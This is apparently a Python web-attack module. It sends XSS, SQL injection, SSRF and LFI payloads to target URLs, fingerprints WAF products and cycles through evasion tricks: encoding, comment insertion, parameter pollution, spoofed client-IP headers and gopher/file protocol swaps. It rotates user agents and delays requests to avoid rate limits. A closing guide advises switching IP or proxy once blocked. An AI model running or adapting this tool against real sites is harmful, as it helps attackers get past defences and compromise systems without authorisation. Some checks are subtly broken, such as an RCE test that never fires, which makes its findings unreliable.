#!/usr/bin/env python3
"""
Aggressive Testing Module with WAF Evasion Techniques
Handles advanced payload testing with anti-detection methods
"""

import requests
import time
import random
import string
import urllib.parse
import base64
import html
import json
import logging
from typing import Dict, List, Optional, Tuple
import re
from itertools import cycle
import hashlib

logger = logging.getLogger(__name__)

class WAFEvasionTester:
    """Advanced vulnerability testing with WAF evasion capabilities"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.aggressive_mode = self.config.get('aggressive_mode', True)
        self.max_retries = self.config.get('max_retries', 3)
        self.base_delay = self.config.get('base_delay', 1.0)
        self.randomize_delays = self.config.get('randomize_delays', True)
        
        # WAF detection patterns
        self.waf_indicators = {
            'cloudflare': [
                'cloudflare', 'cf-ray', '__cfduid', 'cf-cache-status',
                'error 1020', 'access denied', 'ray id'
            ],
            'akamai': [
                'akamai', 'akamai ghost', 'akadns', 'reference #'
            ],
            'aws_waf': [
                'aws', 'x-amzn-requestid', 'x-amz-cf-id', 'forbidden'
            ],
            'imperva': [
                'imperva', 'incapsula', 'visid_incap', '_incap_ses'
            ],
            'f5_bigip': [
                'bigip', 'f5', 'tmui', 'bigipserver'
            ],
            'barracuda': [
                'barracuda', 'barra', 'bnmobilemessaging'
            ],
            'sucuri': [
                'sucuri', 'cloudproxy', 'x-sucuri-id'
            ],
            'generic': [
                'blocked', 'forbidden', 'access denied', 'suspicious activity',
                'security violation', 'threat detected', 'malicious request'
            ]
        }
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        # Session management
        self.sessions = []
        self._create_sessions()
        
    def _create_sessions(self):
        """Create multiple sessions with different characteristics"""
        for i in range(3):  # Create 3 different sessions
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })
            self.sessions.append(session)
    
    def test_payload_aggressive(self, url: str, payload_data: Dict) -> Dict:
        """Perform aggressive testing with WAF evasion"""
        logger.info(f"🚀 Aggressive testing: {payload_data.get('type')} on {url}")
        
        # Initial WAF detection
        waf_info = self._detect_waf(url)
        if waf_info['detected']:
            logger.warning(f"⚠️ WAF detected: {waf_info['type']} - Using evasion techniques")
        
        # Test with multiple evasion techniques
        results = []
        
        # Standard test first
        standard_result = self._test_standard_payload(url, payload_data)
        if standard_result.get('vulnerable'):
            return standard_result
        
        # If standard test failed or blocked, try evasion techniques
        evasion_techniques = self._get_evasion_techniques(payload_data.get('type'))
        
        for technique_name, technique_func in evasion_techniques.items():
            logger.debug(f"Trying evasion technique: {technique_name}")
            
            try:
                evaded_payloads = technique_func(payload_data)
                for evaded_payload in evaded_payloads:
                    result = self._test_evaded_payload(url, evaded_payload, technique_name)
                    if result.get('vulnerable'):
                        result['evasion_technique'] = technique_name
                        result['waf_info'] = waf_info
                        return result
                    
                    # Add delay between attempts
                    self._smart_delay()
                    
            except Exception as e:
                logger.debug(f"Evasion technique {technique_name} failed: {e}")
                continue
        
        # If all evasion failed, return best attempt
        return {
            'vulnerable': False,
            'waf_detected': waf_info['detected'],
            'waf_type': waf_info.get('type'),
            'evasion_attempted': True,
            'techniques_tried': list(evasion_techniques.keys())
        }
    
    def _detect_waf(self, url: str) -> Dict:
        """Detect WAF presence and type"""
        logger.debug(f"🔍 Detecting WAF for {url}")
        
        waf_info = {
            'detected': False,
            'type': None,
            'confidence': 0,
            'indicators': []
        }
        
        try:
            # Send a malicious payload to trigger WAF
            test_payload = "' OR 1=1-- AND <script>alert('xss')</script>"
            session = random.choice(self.sessions)
            
            response = session.get(
                f"{url}?test={urllib.parse.quote(test_payload)}", 
                timeout=10, 
                verify=False
            )
            
            # Check response for WAF indicators
            response_text = response.text.lower()
            response_headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            max_confidence = 0
            detected_waf = None
            
            for waf_type, indicators in self.waf_indicators.items():
                confidence = 0
                found_indicators = []
                
                for indicator in indicators:
                    if (indicator in response_text or 
                        any(indicator in header_value for header_value in response_headers.values()) or
                        any(indicator in header_name for header_name in response_headers.keys())):
                        confidence += 1
                        found_indicators.append(indicator)
                
                if confidence > max_confidence:
                    max_confidence = confidence
                    detected_waf = waf_type
                    waf_info['indicators'] = found_indicators
            
            if max_confidence > 0:
                waf_info['detected'] = True
                waf_info['type'] = detected_waf
                waf_info['confidence'] = max_confidence
                
                logger.info(f"🛡️ WAF detected: {detected_waf} (confidence: {max_confidence})")
            
        except Exception as e:
            logger.debug(f"WAF detection failed: {e}")
        
        return waf_info
    
    def _get_evasion_techniques(self, vuln_type: str) -> Dict:
        """Get appropriate evasion techniques for vulnerability type"""
        techniques = {
            'encoding': self._encoding_evasion,
            'case_variation': self._case_variation_evasion,
            'comment_insertion': self._comment_insertion_evasion,
            'whitespace_manipulation': self._whitespace_evasion,
            'parameter_pollution': self._parameter_pollution_evasion,
            'header_manipulation': self._header_manipulation_evasion
        }
        
        # Add type-specific techniques
        if vuln_type and 'xss' in vuln_type.lower():
            techniques.update({
                'html_encoding': self._html_encoding_evasion,
                'javascript_evasion': self._javascript_evasion,
                'event_handler_evasion': self._event_handler_evasion
            })
        
        if vuln_type and 'sql' in vuln_type.lower():
            techniques.update({
                'sql_comment_evasion': self._sql_comment_evasion,
                'union_evasion': self._union_evasion,
                'hex_encoding': self._hex_encoding_evasion
            })
        
        if vuln_type and 'ssrf' in vuln_type.lower():
            techniques.update({
                'url_encoding': self._url_encoding_evasion,
                'ip_obfuscation': self._ip_obfuscation_evasion,
                'protocol_confusion': self._protocol_confusion_evasion
            })
        
        return techniques
    
    def _test_standard_payload(self, url: str, payload_data: Dict) -> Dict:
        """Test standard payload without evasion"""
        try:
            session = random.choice(self.sessions)
            parameter = payload_data.get('parameter', 'q')
            payload = payload_data.get('payload', '')
            
            # Test GET
            test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
            response = session.get(test_url, timeout=10, verify=False)
            
            # Check for vulnerability indicators
            return self._analyze_response(response, payload_data, test_url)
            
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}
    
    def _test_evaded_payload(self, url: str, evaded_payload_data: Dict, technique: str) -> Dict:
        """Test evaded payload"""
        try:
            session = random.choice(self.sessions)
            
            # Rotate user agent for this request
            session.headers['User-Agent'] = random.choice(self.user_agents)
            
            parameter = evaded_payload_data.get('parameter', 'q')
            payload = evaded_payload_data.get('payload', '')
            method = evaded_payload_data.get('method', 'GET')
            headers = evaded_payload_data.get('headers', {})
            
            # Add custom headers
            for header, value in headers.items():
                session.headers[header] = value
            
            if method.upper() == 'GET':
                test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                response = session.get(test_url, timeout=10, verify=False)
            else:
                data = {parameter: payload}
                response = session.post(url, data=data, timeout=10, verify=False)
                test_url = url
            
            result = self._analyze_response(response, evaded_payload_data, test_url)
            result['evasion_technique'] = technique
            
            return result
            
        except Exception as e:
            return {'vulnerable': False, 'error': str(e), 'evasion_technique': technique}
    
    def _analyze_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for vulnerability indicators"""
        vuln_type = payload_data.get('type', '').lower()
        payload = payload_data.get('payload', '')
        
        # Check if request was blocked (common WAF responses)
        if response.status_code in [403, 406, 429, 501, 502, 503]:
            return {
                'vulnerable': False,
                'blocked': True,
                'status_code': response.status_code,
                'url': test_url
            }
        
        # Type-specific analysis
        if 'xss' in vuln_type:
            return self._analyze_xss_response(response, payload_data, test_url)
        elif 'sql' in vuln_type:
            return self._analyze_sql_response(response, payload_data, test_url)
        elif 'ssrf' in vuln_type:
            return self._analyze_ssrf_response(response, payload_data, test_url)
        elif 'lfi' in vuln_type:
            return self._analyze_lfi_response(response, payload_data, test_url)
        elif 'rce' in vuln_type:
            return self._analyze_rce_response(response, payload_data, test_url)
        
        return {'vulnerable': False, 'url': test_url}
    
    def _analyze_xss_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for XSS indicators"""
        payload = payload_data.get('payload', '')
        
        # Look for script execution indicators
        script_indicators = ['<script>', 'onerror=', 'onload=', 'alert(', 'prompt(', 'confirm(']
        
        response_text = response.text
        
        # Check if payload is reflected and executable
        for indicator in script_indicators:
            if indicator.lower() in response_text.lower() and payload.lower() in response_text.lower():
                return {
                    'vulnerable': True,
                    'type': 'XSS',
                    'url': test_url,
                    'payload': payload,
                    'evidence': self._extract_evidence(response_text, indicator),
                    'severity': 'medium',
                    'confidence': 'high'
                }
        
        # Check for DOM XSS patterns
        dom_patterns = [
            r'document\.write\s*\(\s*["\'][^"\']*' + re.escape(payload),
            r'innerHTML\s*=\s*["\'][^"\']*' + re.escape(payload),
            r'outerHTML\s*=\s*["\'][^"\']*' + re.escape(payload)
        ]
        
        for pattern in dom_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return {
                    'vulnerable': True,
                    'type': 'DOM XSS',
                    'url': test_url,
                    'payload': payload,
                    'evidence': 'DOM manipulation pattern detected',
                    'severity': 'medium',
                    'confidence': 'medium'
                }
        
        return {'vulnerable': False, 'url': test_url}
    
    def _analyze_sql_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for SQL injection indicators"""
        payload = payload_data.get('payload', '')
        response_text = response.text.lower()
        
        # SQL error patterns
        sql_errors = [
            r'sql syntax.*mysql',
            r'warning.*mysql_',
            r'valid mysql result',
            r'postgresql.*error',
            r'warning.*pg_',
            r'valid postgresql result',
            r'oracle error',
            r'oracle.*driver',
            r'sqlserver.*error',
            r'microsoft.*odbc.*sql server',
            r'sqlite.*error',
            r'sqlite3.*operationalerror',
            r'unterminated quoted string',
            r'unexpected end of sql command',
            r'quoted string not properly terminated'
        ]
        
        for pattern in sql_errors:
            if re.search(pattern, response_text):
                return {
                    'vulnerable': True,
                    'type': 'SQL Injection (Error-based)',
                    'url': test_url,
                    'payload': payload,
                    'evidence': self._extract_evidence(response.text, pattern),
                    'severity': 'high',
                    'confidence': 'high'
                }
        
        # Boolean-based blind SQLi detection (simplified)
        if 'SLEEP(' in payload.upper() or 'WAITFOR DELAY' in payload.upper():
            # This would need timing analysis in a real implementation
            pass
        
        return {'vulnerable': False, 'url': test_url}
    
    def _analyze_ssrf_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for SSRF indicators"""
        payload = payload_data.get('payload', '')
        response_text = response.text.lower()
        
        # SSRF indicators
        ssrf_indicators = [
            'root:x:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
            'mysql', 'postgresql', 'redis',       # Internal services
            'apache', 'nginx', 'iis',             # Web servers
            'instance-id', 'ami-id',              # AWS metadata
            'metadata.google.internal',           # GCP metadata
            'localhost', '127.0.0.1', '::1'      # Localhost indicators
        ]
        
        for indicator in ssrf_indicators:
            if indicator in response_text:
                return {
                    'vulnerable': True,
                    'type': 'Server-Side Request Forgery (SSRF)',
                    'url': test_url,
                    'payload': payload,
                    'evidence': self._extract_evidence(response.text, indicator),
                    'severity': 'high',
                    'confidence': 'medium'
                }
        
        return {'vulnerable': False, 'url': test_url}
    
    def _analyze_lfi_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for LFI indicators"""
        payload = payload_data.get('payload', '')
        response_text = response.text
        
        # LFI indicators
        lfi_indicators = [
            'root:x:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
            'localhost', '127.0.0.1',              # hosts file
            '# Copyright', '# This file',           # Common file headers
            '[boot loader]', '[operating systems]' # boot.ini
        ]
        
        for indicator in lfi_indicators:
            if indicator in response_text:
                return {
                    'vulnerable': True,
                    'type': 'Local File Inclusion (LFI)',
                    'url': test_url,
                    'payload': payload,
                    'evidence': self._extract_evidence(response_text, indicator),
                    'severity': 'high',
                    'confidence': 'high'
                }
        
        return {'vulnerable': False, 'url': test_url}
    
    def _analyze_rce_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for RCE indicators"""
        payload = payload_data.get('payload', '')
        
        # Look for command execution output
        if hasattr(payload_data, 'marker'):
            marker = payload_data['marker']
            if marker in response.text:
                return {
                    'vulnerable': True,
                    'type': 'Remote Code Execution (RCE)',
                    'url': test_url,
                    'payload': payload,
                    'evidence': self._extract_evidence(response.text, marker),
                    'severity': 'critical',
                    'confidence': 'high'
                }
        
        return {'vulnerable': False, 'url': test_url}
    
    # Evasion technique implementations
    def _encoding_evasion(self, payload_data: Dict) -> List[Dict]:
        """URL and other encoding evasion techniques"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # Double URL encoding
        double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
        evaded_payloads.append({
            **payload_data,
            'payload': double_encoded,
            'description': 'Double URL encoded'
        })
        
        # Unicode encoding
        unicode_payload = ''.join(f'%u{ord(c):04x}' for c in payload)
        evaded_payloads.append({
            **payload_data,
            'payload': unicode_payload,
            'description': 'Unicode encoded'
        })
        
        # Mixed case encoding
        mixed_encoded = ''
        for i, char in enumerate(payload):
            if i % 2 == 0:
                mixed_encoded += urllib.parse.quote(char)
            else:
                mixed_encoded += char
        evaded_payloads.append({
            **payload_data,
            'payload': mixed_encoded,
            'description': 'Mixed case encoding'
        })
        
        return evaded_payloads
    
    def _case_variation_evasion(self, payload_data: Dict) -> List[Dict]:
        """Case variation evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # All uppercase
        evaded_payloads.append({
            **payload_data,
            'payload': payload.upper(),
            'description': 'Uppercase'
        })
        
        # Alternating case
        alternating = ''.join(c.upper() if i % 2 == 0 else c.lower() 
                            for i, c in enumerate(payload))
        evaded_payloads.append({
            **payload_data,
            'payload': alternating,
            'description': 'Alternating case'
        })
        
        # Random case
        random_case = ''.join(c.upper() if random.choice([True, False]) else c.lower() 
                            for c in payload)
        evaded_payloads.append({
            **payload_data,
            'payload': random_case,
            'description': 'Random case'
        })
        
        return evaded_payloads
    
    def _comment_insertion_evasion(self, payload_data: Dict) -> List[Dict]:
        """Comment insertion evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # SQL comments
        if 'sql' in payload_data.get('type', '').lower():
            # Insert /**/ comments
            commented = payload.replace(' ', '/**/').replace('=', '/**/=/**/')
            evaded_payloads.append({
                **payload_data,
                'payload': commented,
                'description': 'SQL comment insertion'
            })
            
            # Insert -- comments
            parts = payload.split(' ')
            commented = '--\n'.join(parts)
            evaded_payloads.append({
                **payload_data,
                'payload': commented,
                'description': 'SQL line comment insertion'
            })
        
        # HTML comments for XSS
        if 'xss' in payload_data.get('type', '').lower():
            commented = payload.replace('<', '<!--x--><').replace('>', '><!--x-->')
            evaded_payloads.append({
                **payload_data,
                'payload': commented,
                'description': 'HTML comment insertion'
            })
        
        return evaded_payloads
    
    def _whitespace_evasion(self, payload_data: Dict) -> List[Dict]:
        """Whitespace manipulation evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # Tab instead of space
        evaded_payloads.append({
            **payload_data,
            'payload': payload.replace(' ', '\t'),
            'description': 'Tab instead of space'
        })
        
        # Multiple spaces
        evaded_payloads.append({
            **payload_data,
            'payload': payload.replace(' ', '  '),
            'description': 'Multiple spaces'
        })
        
        # Newlines
        evaded_payloads.append({
            **payload_data,
            'payload': payload.replace(' ', '\n'),
            'description': 'Newlines instead of spaces'
        })
        
        # Mixed whitespace
        whitespace_chars = [' ', '\t', '\n', '\r', '\f', '\v']
        mixed = ''
        for char in payload:
            if char == ' ':
                mixed += random.choice(whitespace_chars)
            else:
                mixed += char
        evaded_payloads.append({
            **payload_data,
            'payload': mixed,
            'description': 'Mixed whitespace'
        })
        
        return evaded_payloads
    
    def _parameter_pollution_evasion(self, payload_data: Dict) -> List[Dict]:
        """HTTP parameter pollution evasion"""
        payload = payload_data.get('payload', '')
        parameter = payload_data.get('parameter', 'q')
        evaded_payloads = []
        
        # Split payload across multiple parameters
        if len(payload) > 10:
            mid = len(payload) // 2
            part1, part2 = payload[:mid], payload[mid:]
            
            evaded_payloads.append({
                **payload_data,
                'method': 'GET',
                'url_suffix': f'?{parameter}={urllib.parse.quote(part1)}&{parameter}={urllib.parse.quote(part2)}',
                'description': 'Parameter pollution - split payload'
            })
        
        # Duplicate parameters with decoy
        evaded_payloads.append({
            **payload_data,
            'method': 'GET',
            'url_suffix': f'?{parameter}=innocent&{parameter}={urllib.parse.quote(payload)}',
            'description': 'Parameter pollution - decoy first'
        })
        
        return evaded_payloads
    
    def _header_manipulation_evasion(self, payload_data: Dict) -> List[Dict]:
        """Header manipulation evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # X-Forwarded-For spoofing
        evaded_payloads.append({
            **payload_data,
            'headers': {
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'X-Client-IP': '127.0.0.1'
            },
            'description': 'IP spoofing headers'
        })
        
        # Content-Type manipulation
        evaded_payloads.append({
            **payload_data,
            'headers': {
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-7'
            },
            'description': 'Alternative content type'
        })
        
        # Custom headers to confuse WAF
        evaded_payloads.append({
            **payload_data,
            'headers': {
                'X-Custom-WAF-Bypass': 'true',
                'X-Real-User': 'admin',
                'X-Debug': '1'
            },
            'description': 'Custom bypass headers'
        })
        
        return evaded_payloads
    
    def _html_encoding_evasion(self, payload_data: Dict) -> List[Dict]:
        """HTML encoding evasion for XSS"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # HTML entity encoding
        html_encoded = html.escape(payload)
        evaded_payloads.append({
            **payload_data,
            'payload': html_encoded,
            'description': 'HTML entity encoded'
        })
        
        # Decimal encoding
        decimal_encoded = ''.join(f'&#{ord(c)};' for c in payload)
        evaded_payloads.append({
            **payload_data,
            'payload': decimal_encoded,
            'description': 'Decimal HTML encoding'
        })
        
        # Hex encoding
        hex_encoded = ''.join(f'&#x{ord(c):x};' for c in payload)
        evaded_payloads.append({
            **payload_data,
            'payload': hex_encoded,
            'description': 'Hex HTML encoding'
        })
        
        return evaded_payloads
    
    def _javascript_evasion(self, payload_data: Dict) -> List[Dict]:
        """JavaScript-specific XSS evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # String concatenation
        if 'alert' in payload:
            concat_payload = payload.replace('alert', 'ale'+'rt')
            evaded_payloads.append({
                **payload_data,
                'payload': concat_payload,
                'description': 'String concatenation'
            })
        
        # Character encoding in JS
        if 'alert(' in payload:
            encoded = payload.replace('alert(', 'String.fromCharCode(97,108,101,114,116)(')
            evaded_payloads.append({
                **payload_data,
                'payload': encoded,
                'description': 'JavaScript character encoding'
            })
        
        # Template literals
        if '<script>' in payload:
            template = payload.replace('<script>', '<script>`${alert()}`</script>')
            evaded_payloads.append({
                **payload_data,
                'payload': template,
                'description': 'Template literal'
            })
        
        return evaded_payloads
    
    def _event_handler_evasion(self, payload_data: Dict) -> List[Dict]:
        """Event handler evasion for XSS"""
        evaded_payloads = []
        
        # Alternative event handlers
        event_handlers = [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onpageshow=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>'
        ]
        
        for handler in event_handlers:
            evaded_payloads.append({
                **payload_data,
                'payload': handler,
                'description': f'Event handler: {handler[:20]}...'
            })
        
        return evaded_payloads
    
    def _sql_comment_evasion(self, payload_data: Dict) -> List[Dict]:
        """SQL comment evasion techniques"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # MySQL comment variations
        mysql_comments = [
            payload.replace(' ', '/**/ '),
            payload.replace('UNION', 'UN/**/ION'),
            payload.replace('SELECT', 'SE/**/LECT'),
            payload + '-- -',
            payload + '#'
        ]
        
        for comment_payload in mysql_comments:
            evaded_payloads.append({
                **payload_data,
                'payload': comment_payload,
                'description': 'MySQL comment evasion'
            })
        
        return evaded_payloads
    
    def _union_evasion(self, payload_data: Dict) -> List[Dict]:
        """UNION-based SQL injection evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # UNION variations
        union_variations = [
            payload.replace('UNION', 'UNI/**/ON'),
            payload.replace('UNION', 'UNION ALL'),
            payload.replace('UNION', '/*!12345UNION*/'),
            payload.replace('SELECT', '/*!12345SELECT*/'),
        ]
        
        for union_payload in union_variations:
            evaded_payloads.append({
                **payload_data,
                'payload': union_payload,
                'description': 'UNION evasion'
            })
        
        return evaded_payloads
    
    def _hex_encoding_evasion(self, payload_data: Dict) -> List[Dict]:
        """Hex encoding evasion for SQL"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # Convert strings to hex
        if "'" in payload:
            # Replace string literals with hex
            hex_payload = payload.replace("'", '0x').replace(' ', '')
            evaded_payloads.append({
                **payload_data,
                'payload': hex_payload,
                'description': 'Hex encoding'
            })
        
        return evaded_payloads
    
    def _url_encoding_evasion(self, payload_data: Dict) -> List[Dict]:
        """URL encoding evasion for SSRF"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # Double encoding
        double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
        evaded_payloads.append({
            **payload_data,
            'payload': double_encoded,
            'description': 'Double URL encoding'
        })
        
        # Partial encoding
        partial = ''
        for i, char in enumerate(payload):
            if i % 3 == 0:
                partial += urllib.parse.quote(char)
            else:
                partial += char
        evaded_payloads.append({
            **payload_data,
            'payload': partial,
            'description': 'Partial URL encoding'
        })
        
        return evaded_payloads
    
    def _ip_obfuscation_evasion(self, payload_data: Dict) -> List[Dict]:
        """IP obfuscation for SSRF"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # If payload contains IP addresses, obfuscate them
        ip_patterns = [
            ('127.0.0.1', ['0x7f000001', '2130706433', '127.1', '0177.0.0.1']),
            ('localhost', ['127.0.0.1', '0x7f000001', '[::]']),
            ('192.168.1.1', ['0xc0a80101', '3232235777'])
        ]
        
        for original_ip, alternatives in ip_patterns:
            if original_ip in payload:
                for alt_ip in alternatives:
                    evaded_payloads.append({
                        **payload_data,
                        'payload': payload.replace(original_ip, alt_ip),
                        'description': f'IP obfuscation: {alt_ip}'
                    })
        
        return evaded_payloads
    
    def _protocol_confusion_evasion(self, payload_data: Dict) -> List[Dict]:
        """Protocol confusion for SSRF"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # Alternative protocols
        if 'http://' in payload:
            alternatives = [
                payload.replace('http://', 'https://'),
                payload.replace('http://', 'ftp://'),
                payload.replace('http://', 'gopher://'),
                payload.replace('http://', 'file://'),
                payload.replace('http://', 'dict://'),
                payload.replace('http://', 'ldap://')
            ]
            
            for alt in alternatives:
                evaded_payloads.append({
                    **payload_data,
                    'payload': alt,
                    'description': f'Protocol confusion'
                })
        
        return evaded_payloads
    
    def _smart_delay(self):
        """Implement smart delay to avoid rate limiting"""
        if self.randomize_delays:
            delay = self.base_delay + random.uniform(0, 2)
        else:
            delay = self.base_delay
        
        time.sleep(delay)
    
    def _extract_evidence(self, response_text: str, indicator: str, context_length: int = 300) -> str:
        """Extract evidence context around found indicator"""
        try:
            lower_text = response_text.lower()
            lower_indicator = indicator.lower()
            
            index = lower_text.find(lower_indicator)
            if index == -1:
                return "Evidence found but couldn't extract context"
            
            start = max(0, index - context_length // 2)
            end = min(len(response_text), index + context_length // 2)
            
            context = response_text[start:end]
            return f"...{context}..." if start > 0 or end < len(response_text) else context
        except:
            return "Evidence found"

# WAF Detection and Contingency Documentation
WAF_CONTINGENCY_GUIDE = """
# WAF Detection and Evasion Contingencies

## What WAFs Detect
1. **Signature-based detection**: Known malicious patterns
2. **Behavioral analysis**: Abnormal request patterns
3. **Rate limiting**: Too many requests too quickly
4. **IP reputation**: Known malicious IPs
5. **User-Agent analysis**: Suspicious or missing user agents

## Detection Contingencies

### If WAF is Detected:
1. **Immediate Actions**:
   - Switch to evasion mode automatically
   - Reduce request rate by 50%
   - Rotate user agents and sessions
   - Use proxy rotation if available

2. **Evasion Strategy Selection**:
   - **Cloudflare**: Focus on encoding and case variations
   - **AWS WAF**: Use parameter pollution and header manipulation
   - **Akamai**: Employ whitespace and comment insertion
   - **Imperva**: Try protocol confusion and IP obfuscation

3. **Escalation Path**:
   - Start with subtle evasions (encoding)
   - Progress to structural changes (parameter pollution)
   - Finally attempt aggressive techniques (header manipulation)

### Risk Levels:

#### LOW RISK (Green):
- Standard payloads on unprotected endpoints
- Basic encoding evasion
- Request rate < 1 per 3 seconds

#### MEDIUM RISK (Yellow):
- WAF detected but evasion working
- Some requests blocked (< 20%)
- Request rate 1-2 per second

#### HIGH RISK (Red):
- High block rate (> 50%)
- IP getting flagged/blocked
- Aggressive payloads triggering alerts

### Abort Conditions:
1. **IP blocked** - Stop immediately, switch IP/proxy
2. **Rate limited** - Increase delays significantly
3. **Legal notices** - Abort testing entirely
4. **Account locked** (if testing authenticated) - Stop session

## Recommended Evasion Order:
1. URL encoding variations
2. Case manipulation
3. Whitespace insertion
4. Comment injection
5. Parameter pollution
6. Header manipulation
7. Protocol confusion (SSRF only)
8. Advanced encoding (Unicode, hex)

## Monitoring Indicators:
- Response status codes (403, 406, 429)
- Response time increases
- Challenge pages (CAPTCHA)
- Error messages containing WAF identifiers
- Session termination
"""
